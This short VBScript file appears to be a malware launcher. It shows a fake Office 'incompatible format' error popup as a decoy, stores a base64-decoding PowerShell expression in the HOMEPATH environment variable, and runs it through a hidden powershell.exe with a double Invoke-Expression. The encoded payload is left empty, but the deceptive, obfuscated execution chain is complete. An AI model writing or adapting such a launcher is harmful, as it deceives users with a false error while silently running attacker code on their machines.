Set HOMEPATHS = CreateObject("WScript.Shell")
call HOMEPATHS.PoPup ("The format of this document is not compatible with the version of Office that you are running. Check your computer's system information to see if you need an x86 (32-bit) or x64 (64-bit) version of this file.", -1, "Error", 16)
Set EnvVar = HOMEPATHS.Environment("PROCESS")
EnvVar("HOMEPATH") = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''))"
call HOMEPATHS.Run("powershell.exe ""$env:HOMEPATH|iex|iex""",0,0)
